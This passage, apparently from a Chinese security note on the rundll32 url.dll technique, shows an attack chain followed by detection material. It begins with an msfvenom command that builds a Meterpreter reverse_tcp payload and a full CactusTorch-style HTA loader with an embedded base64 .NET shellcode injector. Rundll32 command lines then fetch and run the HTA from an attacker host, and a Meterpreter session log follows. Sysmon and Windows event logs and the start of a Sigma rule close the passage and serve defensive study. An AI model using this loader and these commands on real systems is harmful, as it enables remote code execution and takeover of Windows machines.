-p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f raw > shell.bin cat shell.bin |base64 -w 0 \u66ff\u6362payload \u5c06\u751f\u6210\u7684payload\u590d\u5236\u5230code\u5904\u3002\u4fdd\u5b58\u4e3ashell.hta <script language=\"VBScript\"> Dim binary : binary =\"rundll32.exe\" Dim code : code =\"payload\"//payload\u63d2\u5165 Sub Debug(s) End Sub Sub SetVersion End Sub Function Base64ToStream(b) Dim enc, length, ba, transform, ms Set enc = CreateObject(\"System.Text.ASCIIEncoding\") length = enc.GetByteCount_2(b) Set transform = CreateObject(\"System.Security.Cryptography.FromBase64Transform\") Set ms = CreateObject(\"System.IO.MemoryStream\") ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b),0, length),0,((length /4)*3) ms.Position =0 Set Base64ToStream = ms End Function Sub Run Dim s, entry_class s =\"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy\" s = s &\"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph\" s = s &\"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk\" s = s &\"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD\" s = s &\"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl\" s = s &\"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU\" s = s &\"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl\" s = s &\"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90\" s = s &\"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu\" s = s &\"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH\" s = s &\"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA\" s = s &\"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw\" s = s &\"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu\" s = s &\"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA\" s = s &\"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u\" s = s &\"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5\" s = s &\"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR\" s = s &\"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA\" s = s &\"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y\" s = s &\"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh\" s = s &\"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz\" s = s &\"ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy\" s = s &\"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA\" s = s &\"AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA\" s = s &\"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA\" s = s &\"AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA\" s = s &\"AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA\" s = s &\"AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA\" s = s &\"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT\" s = s &\"MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA\" s = s &\"Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME\" s = s &\"EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK\" s = s &\"ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK\" s = s &\"EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA\" s = s &\"BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC\" s = s &\"fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP\" s = s &\"AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj\" s = s &\"fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB\" s = s &\"AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA\" s = s &\"ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF\" s = s &\"kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG\" s = s &\"AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I\" s = s &\"qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK\" s = s &\"ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB\" s = s &\"AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE/QAGAHQIPwAGAOcDPwAG\" s = s &\"AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB\" s = s &\"AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW\" s = s &\"gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD\" s = s &\"AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG\" s = s &\"ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I\" s = s &\"+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW\" s = s &\"gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA\" s = s &\"EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW\" s = s &\"IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg\" s = s &\"1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+\" s = s &\"BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA\" s = s &\"BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA\" s = s &\"AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA\" s = s &\"CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB\" s = s &\"AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG\" s = s &\"KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ\" s = s &\"ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA\" s = s &\"hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ\" s = s &\"AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA\" s = s &\"5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ\" s = s &\"AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB\" s = s &\"aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu\" s = s &\"ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA\" s = s &\"WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB\" s = s &\"AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA\" s = s &\"AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN\" s = s &\"b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S\" s = s &\"RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU\" s = s &\"RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP\" s = s &\"TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB\" s = s &\"VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF\" s = s &\"VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT\" s = s &\"X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP\" s = s &\"VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP\" s = s &\"UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ\" s = s &\"VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU\" s = s &\"WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD\" s = s &\"UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP\" s = s &\"Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J\" s = s &\"Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X\" s = s &\"SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO\" s = s &\"SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy\" s = s &\"ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs\" s = s &\"cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl\" s = s &\"cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW\" s = s &\"YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1\" s = s &\"dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh\" s = s &\"ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli\" s = s &\"dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0\" s = s &\"cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz\" s = s &\"ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5\" s = s &\"Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3\" s = s &\"WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI\" s = s &\"RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n\" s = s &\"AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD\" s = s &\"VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz\" s = s &\"SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ\" s = s &\"bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT\" s = s &\"ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt\" s = s &\"ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp\" s = s &\"bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp\" s = s &\"YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh\" s = s &\"Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU\" s = s &\"ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB\" s = s &\"ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk\" s = s &\"SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ\" s = s &\"cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5\" s = s &\"AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX\" s = s &\"AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE\" s = s &\"IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD\" s = s &\"Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE\" s = s &\"IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA\" s = s &\"AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg\" s = s &\"BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS\" s = s &\"DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB\" s = s &\"AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT\" s = s &\"VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3\" s = s &\"NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA\" s = s &\"ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A\" s = s &\"VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA\" s = s &\"AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA\" s = s &\"BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs\" s = s &\"AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA\" s = s &\"cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA\" s = s &\"AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA\" s = s &\"UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu\" s = s &\"ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA\" s = s &\"SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV\" s = s &\"AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA\" s = s &\"AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP\" s = s &\"AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA\" s = s &\"VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw\" s = s &\"AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA\" s = s &\"LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv\" s = s &\"bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA\" entry_class =\"cactusTorch\" Dim fmt, al, d, o Set fmt = CreateObject(\"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\") Set al = CreateObject(\"System.Collections.ArrayList\") al.Add fmt.SurrogateSelector Set d = fmt.Deserialize_2(Base64ToStream(s)) Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class) o.flame binary,code End Sub SetVersion On Error Resume Next Run If Err.Number <>0 Then Debug Err.Description Err.Clear End If self.close </script> \u4e0a\u4f20\u81f3\u670d\u52a1\u5668\u6216\u8005\u672c\u5730 \u672c\u5730\u6267\u884c rundll32.exe url.dll,FileProtocolHandler file://C:\\Users\\John\\Desktop\\shell.hta \u540c\u6837\u53ef\u4ee5\u8c03\u7528url.dll\u4e0b\u8f7dpayload\uff1a rundll32.exe url.dll,OpenURL http://192.168.126.146/shell.hta #\u4f1a\u6709\u5f39\u7a97\u63d0\u793a\u786e\u8ba4\u8fd0\u884c \u53cd\u5f39shell msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 2 opened (192.168.126.146:4444 -> 192.168.126.149:49187) at 2020-04-18 23:48:35 +0800 meterpreter > getuid Server username: 12306Br0-PC\\12306Br0 meterpreter > getsid Server SID: S-1-5-21-3579006141-3881886638-2121494774-1000 \u6d4b\u8bd5\u7559\u75d5 sysmon\u65e5\u5fd7\u8bb0\u5f55 EVentID: 1 Process Create: RuleName: UtcTime: 2020-04-18 15:48:25.994 ProcessGuid: {bb1f7c32-2149-5e9b-0000-00107066a000} ProcessId: 2900 Image: C:\\Windows\\System32\\rundll32.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Windows host process (Rundll32) Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: rundll32.exe url.dll,OpenURL http://192.168.126.146/shell.hta CurrentDirectory: C:\\Users\\12306Br0\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600} LogonId: 0x6e21a TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=963B55ACC8C566876364716D5AAFA353995812A8 ParentProcessGuid: {bb1f7c32-20fc-5e9b-0000-0010bd868700} ParentProcessId: 3808 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" win7\u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55 EVentID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xa30 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\rundll32.exe EVentID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xd04 \u65b0\u8fdb\u7a0b\u540d: C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe EVentID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x8f8 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\mshta.exe \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Suspicious Rundll32 Activity description: Detects suspicious process related to rundll32 based on arguments status: experimental references: - 